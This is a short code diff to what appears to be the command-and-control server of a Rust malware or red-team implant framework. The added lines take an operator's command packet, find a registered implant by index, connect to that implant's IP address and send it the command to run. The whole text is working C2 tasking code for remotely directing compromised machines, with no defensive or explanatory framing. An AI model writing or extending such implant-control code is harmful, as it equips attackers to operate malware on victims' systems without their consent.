@@ -95,6 +95,22 @@ fn run_admin_command(
                 .as_slice(),
             )?;
         }
+        Packet::CommandPacket {
+            implant_id,
+            command,
+        } => {
+            if let Some(ip) = implants.keys().nth(*implant_id) {
+                connect_to_ip(ip)
+                    .write(
+                        encode(Packet::ImplantCommandPacket {
+                            command: command.clone(),
+                        })
+                        .unwrap()
+                        .as_slice(),
+                    )
+                    .unwrap();
+            }
+        }
         _ => {
             stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
         }
@@ -116,4 +132,8 @@ fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAdd
         })
         .map(|(ip, implant)| (*ip, implant.clone()))
         .collect()
+}
+
+fn connect_to_ip(ip: &IpAddr) -> TcpStream {
+    TcpStream::connect(ip.to_string()).unwrap()
 }
